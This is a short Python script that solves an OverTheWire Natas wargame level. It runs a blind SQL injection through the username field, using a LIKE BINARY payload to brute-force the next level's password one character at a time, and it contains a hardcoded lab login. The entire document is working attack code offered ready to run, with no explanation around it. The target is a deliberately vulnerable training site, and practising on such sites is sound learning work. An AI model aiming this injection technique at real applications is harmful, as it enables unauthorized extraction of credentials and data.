import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx") # Change the password if needed

charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9

found = ""

# Brute-force the password
print('Start brute-forcing!!')
for i in range(1, 33): 
    for ch in charset:
        payload = f'natas16" AND password LIKE BINARY "{found + ch}%" -- '

        # Send request
        res = requests.post(url, data={"username": payload}, auth=auth)

        # Check response
        if "This user exists." in res.text:
            found += ch
            print(f"[+] Found so far: {found}")
            break

print(f"\n[✅] Final password for natas16: {found}")